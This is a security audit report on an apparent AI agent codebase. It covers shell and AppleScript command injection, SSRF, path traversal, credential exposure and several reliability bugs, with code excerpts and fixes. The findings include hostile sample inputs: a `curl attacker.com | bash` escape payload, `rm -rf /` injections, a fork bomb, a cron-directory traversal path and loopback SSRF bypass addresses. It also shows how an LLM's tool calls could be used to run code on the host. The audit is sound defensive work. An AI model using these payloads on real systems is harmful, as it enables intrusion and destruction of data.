# Security & Quality Audit Report — `src/lib/`

**Scope**: All 33+ files in `src/lib/` plus `app-builder/` subdirectory  
**Focus**: SQL injection, race conditions, resource leaks, error handling, logic bugs, memory issues, security, type safety  
**Standard**: REAL bugs only — not style preferences

---

## CRITICAL Severity

### 1. Command Injection via `executeBash` — `computer-use-native.ts`

The `executeBash` function passes user/LLM-controlled input directly to a shell:

```ts
// computer-use-native.ts ~line 380
export function executeBash(command: string): { output?: string; error?: string } {
  const result = execSync(command, {
    timeout: 120_000,
    maxBuffer: 10 * 1024 * 1024,
    shell: "/bin/bash",
  });
  // ...
}
```

The `command` parameter comes from the LLM tool call (`input.command`). There is **no sanitization** — the LLM can execute arbitrary shell commands. While the `SENSITIVE_ACTIONS` check in `executeTool` only gates on `execute_code` when the language is bash, the `bash` native tool case in `executeToolInner` calls `executeBash` directly with zero checks:

```ts
case "bash": {
  const r = await executeBash((input.command as string) ?? "");
  // ...
}
```

**Fix**: Add a command allowlist/denylist, or sandbox via Docker. At minimum, block destructive patterns (`rm -rf /`, `mkfs`, `dd`, `:(){:|:&};:`, etc.) before execution.

---

### 2. Command Injection in `getRunCommand` Default Branch — `sandbox-executor.ts`

```ts
// sandbox-executor.ts ~line 115
default:
  return code; // Passed DIRECTLY to `sh -c` with no escaping
```

While Python and Node get shell-safe quoting, the `default` branch returns raw code that gets interpolated into a `docker exec` or `sh -c` call. A language like `ruby` or any unrecognized language will pass LLM-supplied code as a raw shell string.

**Fix**: Apply the same single-quote escaping used for Python/Node:
```ts
default:
  return `sh -c '${code.replace(/'/g, "'\\''")}'`;
```

---

### 3. Command Injection via AppleScript — `computer-use-native.ts`

Multiple functions construct `osascript -e '...'` commands with only single-quote escaping:

```ts
// computer-use-native.ts ~line 180
function appleScriptKey(keyName: string) {
  execSync(`osascript -e 'tell application "System Events" to key code ${keyName}'`);
}
```

And in `computer-use.ts`:

```ts
// computer-use.ts ~line 335
const script = `tell application "System Events" to keystroke ${keyCode} using {${mods.map(m => `${m} down`).join(", ")}}`;
execSync(`osascript -e '${script.replace(/'/g, "'\\''")}'`, { timeout: 5000 });
```

The `keyCode` and action strings originate from LLM tool calls. A crafted `key` value like: `a' -e 'do shell script "curl attacker.com | bash"' -e '` could escape the AppleScript context and execute arbitrary commands.

**Fix**: Validate key names against a known set of safe key codes. Never interpolate LLM output into shell commands.

---

### 4. Command Injection in `cliclick` Calls — `computer-use.ts`

```ts
// computer-use.ts ~line 290
const safeText = action.text
  .replace(/\\/g, "\\\\")
  .replace(/"/g, '\\"')
  // ...
execSync(`cliclick t:"${safeText}"`, { timeout: 10000 });
```

The `safeText` escaping misses shell metacharacters. A text value containing `"$(id)` or backticks would execute as a subcommand since `execSync` runs through the shell.

**Fix**: Use `execFileSync('cliclick', ['t:' + action.text])` (no shell) or apply full shell escaping including `$`, `` ` ``, and `()`.

---

### 5. SSRF via `evaluate` Browser Action — `agent.ts`

```ts
// agent.ts executeBrowseWeb, ~line 3730
case "evaluate": {
  const script = (action.script as string) || (action.code as string) || "document.title";
  const evalResult = await page.evaluate(script);
```

The LLM can pass arbitrary JavaScript to `page.evaluate()`, which runs in the browser context. This enables:
- Stealing cookies: `document.cookie`
- Accessing `localStorage` with auth tokens
- Making fetch requests to internal network endpoints (SSRF)
- Exfiltrating data to external servers

**Fix**: Remove the `evaluate` action type, or restrict to a predefined set of safe extractors.

---

### 6. Path Traversal in `writeFile` / `readFile` — `agent.ts`

The `writeFile` function constructs paths inside the task's files directory:

```ts
// agent.ts writeFile function
async function writeFile(filename: string, content: string, mimeType: string, ctx: ToolContext): Promise<string> {
  const filePath = path.join(ctx.filesDir, filename);
  // ...
  fs.writeFileSync(filePath, content);
```

If `filename` contains `../../etc/cron.d/malicious`, `path.join` will resolve it outside the intended directory. The `readFile` function has the same issue.

**Fix**: Validate that `path.resolve(ctx.filesDir, filename).startsWith(path.resolve(ctx.filesDir))` before any I/O.

---

## HIGH Severity

### 7. Unbounded `page.evaluate` in Browse Auto-Login — `agent.ts`

```ts
// agent.ts attemptAutoLoginIfNeeded, ~line 3350+
const shadowFilled = await page.evaluate(({ username, password }) => {
  // ... uses setter.call(usernameInput, username) ...
}, { username, password });
```

Credentials from `.env.local` are passed directly into `page.evaluate()`. If the page has been compromised (XSS), the credentials are exposed to the attacker's script. Additionally, the evaluate code traverses ALL shadow DOMs looking for password fields — a malicious shadow DOM on any page could capture credentials.

**Fix**: Use Playwright's `page.fill()` API instead of `page.evaluate` with raw credentials.

---

### 8. Race Condition in Scheduler `isRunning` Guard — `scheduler.ts`

```ts
// scheduler.ts
let isRunning = false;
export async function runDueTasks() {
  if (isRunning) return;
  isRunning = true;
  // ...
  isRunning = false;
}
```

In a Next.js environment with multiple concurrent API requests or serverless invocations, this boolean is NOT atomic. Two requests arriving simultaneously can both see `isRunning === false` before either sets it to `true`, causing duplicate task execution.

**Fix**: Use a file-based lock, database advisory lock, or `better-sqlite3` transaction as a mutex.

---

### 9. Module-Level State Leak / Unbounded Growth — Multiple Files

Several module-level `Map`s and arrays grow without bounds:

| File | Variable | Issue |
|------|----------|-------|
| `running-tasks.ts` | `Map<string, AbortController>` | Never cleaned up after task completion |
| `computer-control-sessions.ts` | `Map<string, ComputerSession>` | Never cleaned up |
| `memory-engine.ts` | `globalVocab: Map` | Grows with every memory embed call |
| `agent.ts` | `_beforeToolHooks[]`, `_afterToolHooks[]` | Appended on every HMR reload, never cleared |
| `structured-skills.ts` | `skillCache: Map` | Has MAX_CACHE_SIZE=50 + TTL ✓, OK |
| `model-router.ts` | `performanceCache: Map` | Grows per model×phase×modality×complexity combo |

**Fix**: Add cleanup on task completion for `running-tasks.ts` and `computer-control-sessions.ts`. Guard hook arrays with deduplication. Set upper bounds on caches.

---

### 10. Tavily API Key Leaked in Request Body — `agent.ts`

```ts
// agent.ts executeWebSearch
const tavilyBody = {
  api_key: process.env.TAVILY_API_KEY, // API key sent in body
  query: enhancedQuery,
  // ...
};
const r = await fetch("https://api.tavily.com/search", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify(tavilyBody),
});
```

The Tavily API key is included in the request body. While Tavily's API design requires this, if the request is logged or the search results are included in agent output, the key could leak. Tool results flow back to the LLM and may be included in agent step content visible in the UI.

**Fix**: Ensure API keys in request bodies are never included in agent step outputs or tool result strings. Verify Tavily supports header-based auth as an alternative.

---

### 11. `isUrlSafe` Bypasses — `agent.ts`

```ts
// agent.ts
function isUrlSafe(url: string): boolean {
  const parsed = new URL(url);
  if (!['http:', 'https:'].includes(parsed.protocol)) return false;
  const hostname = parsed.hostname;
  if (/^(127\.|10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|0\.|169\.254\.|localhost$|\[?::1\]?)/.test(hostname)) return false;
  return true;
}
```

Bypasses:
- `http://0177.0.0.1` (octal) → resolves to 127.0.0.1
- `http://2130706433` (decimal IP) → resolves to 127.0.0.1
- `http://127.0.0.1.nip.io` → DNS rebinding
- `http://[::ffff:127.0.0.1]` → IPv4-mapped IPv6 (partial match, but the regex anchor may miss it)
- `http://localtest.me` → resolves to 127.0.0.1

**Fix**: Resolve the hostname to an IP address via `dns.lookup()` and validate the resolved IP, not just the hostname string.

---

## MEDIUM Severity

### 12. N+1 Query in `hydrateTask` — `db.ts`

```ts
// db.ts ~line 500
export function hydrateTask(task: Record<string, unknown>): Task {
  const steps = db.prepare("SELECT * FROM agent_steps WHERE task_id = ? ORDER BY created_at ASC").all(task.id);
  const files = db.prepare("SELECT * FROM task_files WHERE task_id = ? ORDER BY created_at ASC").all(task.id);
  const messages = db.prepare("SELECT * FROM messages WHERE task_id = ? ORDER BY created_at ASC").all(task.id);
  const subTasks = db.prepare("SELECT * FROM sub_tasks WHERE parent_task_id = ? ORDER BY created_at ASC").all(task.id);
  // ...
}
```

When called from `listTasks()` which fetches all tasks, this creates 4 * N queries. For a user with 100 tasks, that's 400+ queries.

**Fix**: Use JOINs or batch fetch with `WHERE task_id IN (...)`.

---

### 13. Missing `await` on Dynamic Import in Error Handler — `agent.ts`

```ts
// agent.ts handleAgentError
try {
  import("./db").then(({ getTask }) => {
    const task = getTask(taskId);
    // ...
  }).catch(() => { /* ignore */ });
} catch { /* best-effort */ }
```

The `.then()` chain is fire-and-forget. If `recordLearning` or `recordAnalyticsEvent` throws, it's silently swallowed. More critically, `recordModelOutcome` is called inside the `.then()` chain — if it throws, the outer `catch` won't catch it.

**Fix**: Use `await import("./db")` with proper try/catch, or add `.catch()` to inner operations.

---

### 14. JSON.parse Without Validation on Tool Arguments — `agent.ts`

```ts
// agent.ts (multiple provider tool exec functions)
let input: Record<string, unknown> = {};
try { input = JSON.parse(tc.arguments); } catch { /* empty */ }
```

If the LLM sends malformed JSON, `input` stays as `{}` and the tool executes with all-undefined parameters. For tools like `execute_code`, this means `language` and `code` are both `undefined`, which will pass through to `executeCode` and potentially cause unexpected behavior.

**Fix**: If JSON parse fails, return an error to the LLM instead of executing with empty input.

---

### 15. `ToolCallCache` Uses `JSON.stringify` for Key Fingerprinting — `agent.ts`

```ts
// agent.ts ToolCallCache
private key(name: string, input: Record<string, unknown>): string {
  return `${name}::${JSON.stringify(input)}`;
}
```

`JSON.stringify` is not order-stable: `{a:1, b:2}` and `{b:2, a:1}` produce different keys. Cache misses will cause the same tool to be re-executed with identical semantics but different key order.

**Fix**: Sort object keys before stringifying: `JSON.stringify(input, Object.keys(input).sort())`.

---

### 16. Playwright Browser Instance Leak on Error — `agent.ts`

```ts
// agent.ts fetchViaPlaywright
async function fetchViaPlaywright(url: string, selector?: string): Promise<string | null> {
  const browser = await pw.chromium.launch({ headless: true });
  try {
    const page = await browser.newPage({ ... });
    await page.goto(url, ...);
    // ...
    return result;
  } finally {
    await browser.close();
  }
}
```

If `browser.newPage()` or `page.goto()` throws, `browser.close()` is called in `finally` — this is correct. However, the outer `catch` at the bottom:

```ts
} catch {
  return null; // Playwright not installed or failed — give up
}
```

This catch wraps the entire function including `import("playwright")`. If `chromium.launch()` fails (e.g., no Chrome installed), the `finally` block won't execute since `browser` is undefined. This is handled safely. **However**, in the `executeBrowseWeb` function, the Steel session path has a `try/finally` with `steel.release()`, but if `createSteelSession` itself throws, there's no release call and the remote browser session leaks on Steel's side.

**Fix**: Wrap `createSteelSession` in try/catch and ensure release is only called when session was obtained.

---

### 17. Sensitive Data in Agent Step Content — `agent.ts`

Tool inputs (including API keys, credentials, file contents) are stored in `agent_steps.content` and `agent_steps.tool_input` via `addAgentStep`:

```ts
const toolStep: AgentStep = {
  // ...
  content: JSON.stringify(input, null, 2), // Full tool input including sensitive fields
  tool_input: input,
  // ...
};
addAgentStep(toolStep);
```

For `send_email`, this stores the email body. For `connector_call`, this stores API parameters. For `execute_code`, this stores the full code. These are visible in the UI via task step history.

**Fix**: Redact sensitive fields (passwords, tokens, API keys) from `tool_input` before persisting. Add a sanitizer that strips known-sensitive field names.

---

### 18. Missing Content-Length Validation on Scrape Responses — `agent.ts`

```ts
// agent.ts executeScrapeUrl
html = await resp.text();
```

There's no check on `Content-Length`. A malicious URL could return a multi-gigabyte response, consuming all available memory since `resp.text()` buffers the entire body.

**Fix**: Check `Content-Length` header and abort if > reasonable limit (e.g., 10MB). Or use streaming with a byte counter.

---

### 19. Plugin Hooks Can Block Agent Execution Indefinitely — `agent.ts`

```ts
// agent.ts
async function runBeforeHooks(ctx: ToolHookContext) {
  for (const hook of _beforeToolHooks) {
    const result = await hook(ctx);
    if (!result.allow) return result;
  }
  // ...
}
```

If a registered hook hangs (e.g., makes a network call that never resolves), the entire agent loop stalls with no timeout.

**Fix**: Add a timeout wrapper: `await Promise.race([hook(ctx), timeoutPromise(5000)])`.

---

### 20. `updateMemory` in `db.ts` Doesn't Use Parameterized Column Sets Safely — `db.ts`

```ts
// db.ts updateMemory
const sets: string[] = [];
// ...
db.prepare(`UPDATE memory SET ${sets.join(", ")} WHERE id = ?`).run(...vals);
```

While the column names are hardcoded and safe, the pattern of building SQL via string concatenation with `sets.join(", ")` is fragile. If a future developer adds a user-controlled field to `sets`, it becomes a SQL injection vector.

**Fix**: Use a safe builder pattern or validate that all set clauses are from a known allowlist.

---

### 21. `incrementSkillUsage` — SQL Column Name via String Interpolation — `db.ts`

```ts
// db.ts
export function incrementSkillUsage(skillId: string, field: "success" | "failure"): void {
  const col = field === "success" ? "success_count" : "failure_count";
  db.prepare(`UPDATE skills SET ${col} = ${col} + 1, ...`).run(skillId);
}
```

The `field` parameter IS constrained by the TypeScript type, but the SQL uses string interpolation for the column name. At runtime, TypeScript types are erased — if called from JavaScript or with `as any`, arbitrary SQL could be injected.

**Fix**: Use a Map lookup instead of interpolation:
```ts
const FIELDS = { success: "success_count", failure: "failure_count" } as const;
const col = FIELDS[field]; if (!col) throw new Error("Invalid field");
```

---

## LOW Severity

### 22. Missing AbortSignal Propagation to `fetch` Calls — `agent.ts`

The `signal` parameter is checked at the top of each agent loop iteration, but individual tool executions (web searches, scrape calls, browser actions) don't propagate the abort signal. If a user cancels a task, the current tool call runs to completion.

**Fix**: Pass `signal` through `ToolContext` and use it in all `fetch()` calls within tool implementations.

---

### 23. `background-ops.ts` — No Server-Side Rendering Guard on Store

```ts
let operations = new Map<string, BackgroundOp>();
let listeners = new Set<() => void>();
```

These module-level mutables work fine in the browser but could cause issues if the module is ever imported server-side in Next.js SSR, since state would be shared across requests.

**Fix**: Already mitigated by React's `useSyncExternalStore` + client-only usage pattern. No action needed unless server-side import happens.

---

### 24. `handoff-store.ts` — JSON.parse Without Try/Catch Deduplication

```ts
export function getShelf(): HandoffItem[] {
  try {
    const raw = localStorage.getItem(SHELF_KEY);
    return raw ? (JSON.parse(raw) as HandoffItem[]) : [];
  } catch { return []; }
}
```

This is correctly guarded. **No issue** — included for completeness.

---

### 25. `memory-engine.ts` — Cosine Similarity Division by Zero

```ts
// memory-engine.ts
function cosineSimilarity(a: Map<string, number>, b: Map<string, number>): number {
  // ...
  const magA = Math.sqrt(sumAA);
  const magB = Math.sqrt(sumBB);
  return (magA && magB) ? dot / (magA * magB) : 0;
}
```

This IS correctly guarded against division by zero. **No issue**.

---

### 26. `model-router.ts` — Fallback When No API Keys Configured

```ts
if (available.length === 0) {
  return {
    provider: "anthropic",
    modelName: "claude-sonnet-4-6",
    reasoning: "No API keys found — defaulting to Anthropic Claude Sonnet",
    confidence: 0.3,
    alternatives: [],
  };
}
```

Returns a model that can't work (no API key). The caller will fail with an auth error rather than a clear "no providers configured" message.

**Fix**: Throw or return a specific error state.

---

### 27. Social Media Cookie Persistence Without Encryption — `social-media-browser.ts`

```ts
// social-media-browser.ts
function getCookiePath(platform: SocialPlatform): string {
  return path.join(getProfileDir(platform), "cookies.json");
}
// Cookies + localStorage are saved as plaintext JSON to ~/.ottomate/browser-profiles/
```

Session cookies and localStorage (potentially containing auth tokens) are stored as plaintext JSON files in the user's home directory. Any local process can read them.

**Fix**: Encrypt at rest using `crypto.createCipheriv` with a machine-local key, or use OS keychain.

---

### 28. `computer-use.ts` — Shell Injection in `xdotool` Commands (Linux)

```ts
// computer-use.ts executeLinuxMouse
execSync(`xdotool mousemove ${x} ${y} click 1`, { timeout: 5000 });
```

The `x` and `y` values come from LLM tool calls. If they're not validated as integers, a crafted value like `100; rm -rf /` would be injected. The TypeScript types suggest numbers, but at runtime no validation occurs.

**Fix**: `parseInt(x, 10)` and validate before interpolation, or use `execFileSync`.

---

### 29. `steel-client.ts` — API Key in WebSocket URL

```ts
browser = await chromium.connectOverCDP(
  `${steelWsBase()}?apiKey=${apiKey}&sessionId=${sessionId}`
);
```

The API key is passed as a query parameter in the WebSocket URL. WebSocket URLs may be logged by proxies, browser devtools, or server access logs.

**Fix**: If Steel supports it, pass the API key as a header instead.

---

### 30. `executable-connectors.ts` — GitHub API Path Injection

```ts
// executable-connectors.ts (GitHub connector)
const url = `https://api.github.com/repos/${params.owner}/${params.repo}/issues`;
```

If `params.owner` or `params.repo` contain path traversal characters (e.g., `../`), they could manipulate the API endpoint. While GitHub's API would likely reject this, it's still unsanitized URL construction.

**Fix**: `encodeURIComponent(params.owner)` and `encodeURIComponent(params.repo)`.

---

## Summary

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **CRITICAL** | 6 | Command injection (shell, AppleScript, cliclick), SSRF, path traversal |
| **HIGH** | 5 | Credential exposure, race conditions, memory leaks, API key leakage, SSRF bypasses |
| **MEDIUM** | 10 | N+1 queries, missing validation, cache bugs, resource leaks, SQL patterns |
| **LOW** | 9 | Missing abort propagation, plaintext cookies, URL param keys |

**Most urgent fixes**: Items 1-6 (command injection and path traversal) should be addressed immediately as they allow arbitrary code execution from LLM tool calls.
